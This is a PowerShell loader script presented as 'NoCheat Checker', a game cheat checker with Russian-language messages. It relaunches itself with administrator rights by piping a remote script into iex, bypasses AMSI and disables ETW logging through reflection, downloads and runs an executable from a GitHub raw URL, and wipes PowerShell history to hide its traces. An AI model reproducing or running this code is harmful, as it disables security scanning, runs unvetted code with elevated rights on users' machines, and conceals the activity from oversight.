$ErrorActionPreference = "Stop"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

function Clear-PSHistory {
    Clear-History -ErrorAction SilentlyContinue
    try {
        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
        if ($historyPath -and (Test-Path $historyPath)) {
            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
        }
    } catch {}
}

if (-not $isAdmin) {
    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
    Clear-PSHistory
    exit
}

Write-Host "==========================================" -ForegroundColor Yellow
Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
Write-Host "==========================================" -ForegroundColor Yellow

try {
    $amsiType = [psobject].Assembly.GetType("System.Management.Automation.AmsiUtils")
    if ($amsiType) {
        $amsiField = $amsiType.GetField("amsiInitFailed", [Reflection.BindingFlags] "NonPublic,Static")
        if ($amsiField) { $amsiField.SetValue($null, $true) }
    }
} catch {}

try {
    $etwType = [psobject].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider")
    if ($etwType) {
        $etwField = $etwType.GetField("etwProvider", [Reflection.BindingFlags] "NonPublic,Static")
        if ($etwField) {
            $etwProvider = $etwField.GetValue($null)
            if ($etwProvider) {
                $enabledField = $etwProvider.GetType().GetField("m_enabled", [Reflection.BindingFlags] "NonPublic,Instance")
                if ($enabledField) { $enabledField.SetValue($etwProvider, 0) }
            }
        }
    }
} catch {}

$repoOwner  = "die4mebaby"
$repoName   = "CheatChecker"
$branch     = "main"
$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"

$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"

if (-not (Test-Path $workDir)) {
    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
}

$exePath = Join-Path $workDir "nocheat.checker.exe"

try {
    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
    
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($exeUrl, $exePath)
    
    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
    }

    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
    
    Start-Process -FilePath $exePath -WorkingDirectory $workDir
}
catch {
    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
}

Clear-PSHistory
exit
